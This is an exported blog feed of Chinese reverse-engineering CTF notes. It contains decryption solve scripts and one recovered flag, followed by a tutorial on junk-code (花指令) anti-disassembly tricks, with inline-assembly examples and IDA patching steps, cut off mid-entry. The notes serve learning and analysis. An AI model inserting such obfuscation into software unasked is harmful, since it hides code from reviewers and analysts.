class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(i)&lt;=<span class="hljs-number">47</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i)&gt;<span class="hljs-number">57</span>):<br>                tmp+=i<br>            <span class="hljs-keyword">else</span>:<br>                tmp+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">48</span>-<span class="hljs-number">3</span>)%<span class="hljs-number">10</span>+<span class="hljs-number">48</span>)<br>        <span class="hljs-keyword">else</span>:<br>            tmp+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">97</span>-<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>)<br>    <span class="hljs-keyword">else</span>:<br>        tmp+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">65</span>-<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">65</span>)<br><span class="hljs-built_in">print</span>(tmp)<br>flag=tmp[<span class="hljs-number">13</span>:<span class="hljs-number">26</span>]+tmp[<span class="hljs-number">39</span>:<span class="hljs-number">52</span>]+tmp[:<span class="hljs-number">13</span>]+tmp[<span class="hljs-number">26</span>:<span class="hljs-number">39</span>]<br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><h1 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h1><p><font style="color:#000000;">发现加密函数<br></font><font style="color:#000000;">所以是需要找到密文即可解出flag。<br></font><font style="color:#000000;">可以看出密文就是dword_404000。在该内存空间中找，找到100个数据即为密文。<br></font><font style="color:#000000;">根据加密逻辑，可以看出没两个数据中高位是ASCII码的高。低位是ASCII码的低位，编写脚本解出</font></p><p><font style="color:#000000;"></font></p><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1721460339801-09eef6d1-3520-4ef4-9bb8-c010024c0d86-989820.png" alt="1721460339801-09eef6d1-3520-4ef4-9bb8-c010024c0d86.png"></p><p><img src="/./img/49277317_pdbh26fxJXiXuxOX/1721460396040-f629698d-b0ed-4069-8137-831fca288b0f-546584.png" alt="1721460396040-f629698d-b0ed-4069-8137-831fca288b0f.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">a = [<br>  8, 6, 7, 6, 1, 6, 13, 6, 5, 6, 11, 7, 5, 6, 14, 6, 3, 6, 15, 6, 4, 6,<br>  5, 6, 15, 5, 9, 6, 3, 7, 15, 5, 5, 6, 1, 6, 3, 7, 9, 7, 15, 5, 6, 6,<br>  15, 6, 2, 7, 15, 5, 1, 6, 15, 5, 2, 7, 5, 6, 6, 7, 5, 6, 2, 7, 3, 7,<br>  5, 6, 15, 5, 5, 6, 14, 6, 7, 6, 9, 6, 14, 6, 5, 6, 5, 6, 2, 7, 13, 7,<br>  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0<br>]<br>b=&#x27;&#x27;<br>for i in range(50):<br>    f1=a[i*2]&amp;0xF<br>    f2=(a[i*2+1]&amp;0xF) &lt;&lt; 4<br>    flag=f1 | f2<br>    b+=chr(flag)<br>print(b)<br><br></code></pre></td></tr></table></figure><p>exp2</p><p><font style="color:#000000;">根据加密逻辑，可以看出没两个数据中高位是ASCII码的高。低位是ASCII码的低位，编写脚本解出</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[8, 6, 7, 6, 1, 6, 13, 6, 5, 6,11, 7, 5, 6,14,<br>6, 3, 6,15, 6, 4, 6, 5, 6, 15, 5, 9, 6, 3,7 ,15,5,5<br>,6, 1, 6, 3, 7, 9, 7,15, 5,6,6,15,<br>6, 2, 7,15, 5, 1, 6,15, 5, 2, 7, 5,6,6, 7, 5,<br>6, 2, 7, 3, 7, 5, 6,15,5,5, 6,14, 6, 7, 6, 9, 6,14,<br>6, 5, 6, 5, 6, 2,7,13,7]<br>b=[0 for i in range(100)]<br>res=&quot;&quot;<br>for i in range(44):<br>    c1=a[2*i]<br>    c2=a[2*i+1]<br>    res+=chr(c2*16+c1)<br>print(res)<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-06-29 18:49:19<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/firbpo49ggcotccz">https://www.yuque.com/chaye-apqbl/vsc85q/firbpo49ggcotccz</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E4%BE%8B%E9%A2%98/moe%E5%BA%B7%E5%A4%8D%E8%AE%AD%E7%BB%83/"/>
    <url>/2026/01/19/RE/%E4%BE%8B%E9%A2%98/moe%E5%BA%B7%E5%A4%8D%E8%AE%AD%E7%BB%83/</url>
    
    <content type="html"><![CDATA[<h1 id="moe-康复训练"><a href="#moe-康复训练" class="headerlink" title="moe 康复训练"></a>moe 康复训练</h1><h1 id="A-game"><a href="#A-game" class="headerlink" title="A_game"></a>A_game</h1><p>看了一下是个数独题目</p><p><img src="/./img/PQU6GAxPa3z-_LYG/1748414863970-eee04499-9ae7-495c-80cf-6379bb4c403d-446997.png" alt="1748414863970-eee04499-9ae7-495c-80cf-6379bb4c403d.png"></p><p>提取box，顺便整理一下</p><p><img src="/./img/PQU6GAxPa3z-_LYG/1748415326666-9f8543c6-d1a1-4bb9-9c55-af44a9198b9d-634760.png" alt="1748415326666-9f8543c6-d1a1-4bb9-9c55-af44a9198b9d.png"></p><p><a href="https://sudokusolving.bmcx.com/">https://sudokusolving.bmcx.com/</a></p><p><img src="/./img/PQU6GAxPa3z-_LYG/1748415414031-78f0bc0f-c726-4d51-8089-5c774b6c3a01-077253.png" alt="1748415414031-78f0bc0f-c726-4d51-8089-5c774b6c3a01.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">box=[<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">6</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">4</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">9</span>,   <span class="hljs-number">6</span>,   <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">6</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">9</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">8</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">9</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">2</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">9</span>,<br>    <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">8</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">9</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">6</span>]<br><span class="hljs-string">&#x27;&#x27;&#x27;for i in range(len(box)):</span><br><span class="hljs-string">print(box[i],end=&#x27;&#x27;)&#x27;&#x27;&#x27;</span><br>magic=[<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x5D</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x1C</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>]<br>buf1=<span class="hljs-string">&#x27;825914367671358924349672581186429735952763148437185692268537419714296853593841276&#x27;</span><br>buf2=<span class="hljs-string">&#x27;005004360000050024049670000106020030900700108030005090200507009704000800090040006&#x27;</span><br>buf3=<span class="hljs-string">&#x27;8291767138932581849755263447186268341129653538127&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buf1)):<br>    <span class="hljs-keyword">if</span> buf1[i] !=buf2[i]:<br>        <span class="hljs-built_in">print</span>(buf1[i],end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#print(len(buf),len(magic))</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buf3)):<br>    flag=<span class="hljs-built_in">ord</span>(buf3[k])^magic[k]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#flag=&#x27;moectf&#123;S0_As_I_prAy_Un1imited_B1ade_WOrks---E1m1ya_Shiro&#125;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-05-29 09:45:18<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/vf84gvwd6vormkmn">https://www.yuque.com/chaye-apqbl/vsc85q/vf84gvwd6vormkmn</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E4%BE%8B%E9%A2%98/index/"/>
    <url>/2026/01/19/RE/%E4%BE%8B%E9%A2%98/index/</url>
    
    <content type="html"><![CDATA[<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h1 id="1、进制转换"><a href="#1、进制转换" class="headerlink" title="1、进制转换"></a>1、进制转换</h1><h2 id="负数的16进制要用补码来表示"><a href="#负数的16进制要用补码来表示" class="headerlink" title="负数的16进制要用补码来表示"></a>负数的16进制要用补码来表示</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title function_ invoke__">main</span>(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> char **argv, <span class="hljs-keyword">const</span> char **envp)<br>&#123;<br>  size_t v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+Ch] [rbp-134h] BYREF</span><br>  unsigned <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-130h]</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+14h] [rbp-12Ch]</span><br>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+18h] [rbp-128h]</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+1Ch] [rbp-124h]</span><br>  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// [rsp+20h] [rbp-120h]</span><br>  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// [rsp+24h] [rbp-11Ch]</span><br>  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [rsp+28h] [rbp-118h]</span><br>  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// [rsp+2Ch] [rbp-114h]</span><br>  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [rsp+30h] [rbp-110h]</span><br>  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [rsp+34h] [rbp-10Ch]</span><br>  unsigned __int64 v16; <span class="hljs-comment">// [rsp+38h] [rbp-108h]</span><br>  <span class="hljs-keyword">int</span> v17[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-100h]</span><br>  char s[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+60h] [rbp-E0h] BYREF</span><br>  char v19[<span class="hljs-number">107</span>]; <span class="hljs-comment">// [rsp+65h] [rbp-DBh] BYREF</span><br>  char dest[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+D0h] [rbp-70h] BYREF</span><br>  unsigned __int64 v21; <span class="hljs-comment">// [rsp+138h] [rbp-8h]</span><br><br>  v21 = <span class="hljs-title function_ invoke__">__readfsqword</span>(<span class="hljs-number">0</span>x28u);<br>  v7 = <span class="hljs-number">80</span>;<br>  v8 = <span class="hljs-number">64227</span>;<br>  v9 = <span class="hljs-number">226312059</span>;<br>  v10 = -<span class="hljs-number">1540056586</span>;<br>  v11 = <span class="hljs-number">5</span>;<br>  v12 = <span class="hljs-number">16</span>;<br>  v13 = <span class="hljs-number">3833</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-title function_ invoke__">puts</span>(<span class="hljs-string">&quot;plz input the key:&quot;</span>);<br>  <span class="hljs-title function_ invoke__">__isoc99_scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  v3 = <span class="hljs-title function_ invoke__">strlen</span>(s);<br>  <span class="hljs-title function_ invoke__">strncpy</span>(dest, v19, v3 - <span class="hljs-number">6</span>);<br>  dest[<span class="hljs-title function_ invoke__">strlen</span>(s) - <span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-title function_ invoke__">__isoc99_sscanf</span>(dest, <span class="hljs-string">&quot;%x&quot;</span>, &amp;v5);<br>  v17[<span class="hljs-number">0</span>] = v7;<br>  v17[<span class="hljs-number">1</span>] = v8;<br>  v17[<span class="hljs-number">2</span>] = v9;<br>  v17[<span class="hljs-number">3</span>] = v10;<br>  v17[<span class="hljs-number">4</span>] = (v11 &lt;&lt; <span class="hljs-number">12</span>) + v12;<br>  v17[<span class="hljs-number">5</span>] = v13;<br>  v17[<span class="hljs-number">6</span>] = v5;<br>  v16 = <span class="hljs-number">0</span>LL;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( v16 += (unsigned <span class="hljs-keyword">int</span>)v17[i]; v16 &gt; <span class="hljs-number">0xFFFF</span>; v16 = v15 + (unsigned <span class="hljs-keyword">int</span>)(unsigned __int16)v16 )<br>    &#123;<br>      v14 = (unsigned __int16)v16;<br>      v15 = v16 &gt;&gt; <span class="hljs-number">16</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v16 == <span class="hljs-number">0xFFFF</span> )<br>    <span class="hljs-title function_ invoke__">puts</span>(<span class="hljs-string">&quot;OK&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-title function_ invoke__">puts</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_j8iR4Qu8LsEvzJE8/1715339407886-4f402e28-e9ee-42fc-b0a7-e9ddbe39c300-164877.png" alt="1715339407886-4f402e28-e9ee-42fc-b0a7-e9ddbe39c300.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">v7 = 80<br>v8 = 64227<br>v9 = 226312059<br>v10 = -1540056586<br>v11 = 5<br>v12 = 16<br>v13 = 3833<br>for x in range(0xffff):<br>    v17 = [v7, v8, v9,0xA43499F6, (v11 &lt;&lt; 12) + v12, v13, x]<br>    v16 = 0<br>    for i in range(7):<br>        v16 += v17[i]<br>        while v16 &gt; 0xffff:<br>                v15 = v16 &gt;&gt; 16<br>                v16 = (v15 + (v16 &amp; 0xffff)) &amp; 0xffffffff<br>    if v16 == 0xffff:<br>        print(hex(x))<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-07-19 09:58:00<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/dw6mf4rvefpa7omi">https://www.yuque.com/chaye-apqbl/vsc85q/dw6mf4rvefpa7omi</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
    <url>/2026/01/19/RE/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><p>参考链接：</p><p><a href="https://blog.csdn.net/m0_51246873/article/details/127167749">https://blog.csdn.net/m0_51246873&#x2F;article&#x2F;details&#x2F;127167749</a></p><p><a href="https://www.cnblogs.com/YenKoc/p/14136012.html">https://www.cnblogs.com/YenKoc/p/14136012.html</a></p><p><a href="https://www.xjx100.cn/news/40167.html?action=onClick">https://www.xjx100.cn/news/40167.html?action=onClick</a></p><p><a href="https://mp.weixin.qq.com/s/MUth1Qw-Fl2a5OrLw_2_0g">https://mp.weixin.qq.com/s/MUth1Qw-Fl2a5OrLw_2_0g</a></p><h3 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h3><ul><li><font style="color:rgba(0, 0, 0, 0.9);">0xE8 call + 4字节偏移地址</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">0xE9 jmp + 4字节偏移地址</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">0xEB jmp + 2字节偏移地址</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">0xFF15 call + 4字节地址</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">0xFF25 jmp + 4字节地址</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">0xcc int 3</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">0xe2 loop</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">0x0f84 jz</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">0x0f85 jnz</font></li></ul><h1 id="一、什么是花指令"><a href="#一、什么是花指令" class="headerlink" title="一、什么是花指令"></a>一、什么是花指令</h1><h2 id="1）定义"><a href="#1）定义" class="headerlink" title="1）定义"></a>1）定义</h2><p>花指令又名垃圾代码、脏字节，英文名是junk code。花指令就是在不影响程序运行的情况下，往真实代码中插入一些垃圾代码，从而影响反汇编器的正常运行；或是起到干扰逆向分析人员的静态分析，增加分析难度和分析时间。</p><h2 id="2）分类"><a href="#2）分类" class="headerlink" title="2）分类"></a>2）分类</h2><p>花指令分为不可执行花指令、可执行花指令</p><p>可执行花指令 顾名思义，可以执行的花指令，这部分垃圾代码会在程序运行的时候执行，但是执行这些指令没有任何意义，并不会改变寄存器的值，同时反汇编器也可以正常的反汇编这些指令。目的是为了增加静态分析的难度，加大逆向分析人员的工作量。</p><p>不可执行花指令 不可以执行的花指令，这类花指令会使反编译器在反编译的时候出错，反汇编器可能错误的反汇编这些指令。根据反汇编的工作原理，只有花指令同正常指令的前几个字节被反汇编器识别成一组无用字节时，才能破坏反汇编的结果。因此，插入的花指令应当是一些不完整的指令，被插入的不完整指令可以是随机选择的。</p><p>为了能够有效迷惑反汇编器，同时又确保代码的正确运行，花指令必须满足两个基本特征，即：</p><p>垃圾数据必须是某个合法指令的一部分。</p><p>程序运行时，花指令必须位于实际不可执行的代码路径。</p><h2 id="3）原理：反汇编算法的设计缺陷"><a href="#3）原理：反汇编算法的设计缺陷" class="headerlink" title="3）原理：反汇编算法的设计缺陷"></a>3）原理：反汇编算法的设计缺陷</h2><h3 id="常用的两类反汇编算法："><a href="#常用的两类反汇编算法：" class="headerlink" title="常用的两类反汇编算法："></a>常用的两类反汇编算法：</h3><h3 id="1-线性扫描算法：逐行反汇编（无法将数据和内容进行区分）"><a href="#1-线性扫描算法：逐行反汇编（无法将数据和内容进行区分）" class="headerlink" title="1.线性扫描算法：逐行反汇编（无法将数据和内容进行区分）"></a>1.线性扫描算法：逐行反汇编（无法将数据和内容进行区分）</h3><h3 id="2-递归行进算法：按照代码可能的执行顺序进行反汇编程序。"><a href="#2-递归行进算法：按照代码可能的执行顺序进行反汇编程序。" class="headerlink" title="2.递归行进算法：按照代码可能的执行顺序进行反汇编程序。"></a>2.递归行进算法：按照代码可能的执行顺序进行反汇编程序。</h3><p>通过构造必然条件或者互补条件，使得反汇编出错。</p><p>简单的花指令 0xe8是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析。</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721353714172-ef35ee9e-46b1-4b38-8f69-d092c481c64e-329167.png" alt="1721353714172-ef35ee9e-46b1-4b38-8f69-d092c481c64e.png"></p><p>两个跳转一个指向无效数据，一个指向正常数据来干扰递归扫描算法。</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721353731931-85bade96-9930-45db-8310-219b37978149-418514.png" alt="1721353731931-85bade96-9930-45db-8310-219b37978149.png"></p><h1 id="二、花指令实现"><a href="#二、花指令实现" class="headerlink" title="二、花指令实现"></a>二、花指令实现</h1><h2 id="1-简单jmp"><a href="#1-简单jmp" class="headerlink" title="1.简单jmp"></a>1.简单jmp</h2><p>这是最简单的花指令。</p><p>这种jmp单次跳转只能骗过线性扫描算法，会被IDA识别（递归下降）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">__asm&#123;<br>    jmp label1<br>    db junkcode<br>label1:    <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721353831882-437540b9-d9ee-444d-ae43-d6fefd84e2a4-287211.png" alt="1721353831882-437540b9-d9ee-444d-ae43-d6fefd84e2a4.png"></p><h2 id="2-多层跳转"><a href="#2-多层跳转" class="headerlink" title="2.多层跳转"></a>2.多层跳转</h2><p>本质上和简单跳转是一样的，只是加了几层跳转。显然无法干扰ida</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">start:<span class="hljs-comment">//花指令开始</span><br>    jmp label1<br>    DB junkcode<br>label1:<br>     jmp label2<br>     DB junkcode<br>label2：<br>    jmp label3<br>    DB junkcode<br>label3<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721353897203-27c5bf24-9868-4bf7-87fe-934e95597735-998471.png" alt="1721353897203-27c5bf24-9868-4bf7-87fe-934e95597735.png"></p><p>和单次跳转一样，这种也会被IDA识别。</p><p>为了骗过IDA，我们将上面的花指令改写一下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">__asm &#123;<br>       _emit <span class="hljs-number">0xE8</span><br>       _emit <span class="hljs-number">0xFF</span><br>            <span class="hljs-comment">//_emit 立即数：代表在这个位置插入一个数据，这里插入的是0xe8</span><br>      &#125;<br></code></pre></td></tr></table></figure><p>查看反汇编后的结果</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721353917638-face0e41-fb41-4564-abca-f16174675321-848968.png" alt="1721353917638-face0e41-fb41-4564-abca-f16174675321.png"></p><p>可以看到IDA错误的识别loc_411877处的代码，成功的实现了花指令的目的。那么我们知道了如何构造，自然也就明白了如何去除，只需要将插入的立即数nop掉即可，点击0xe8和0xff，点击右键，选择patching-&gt;change byte</p><p><img 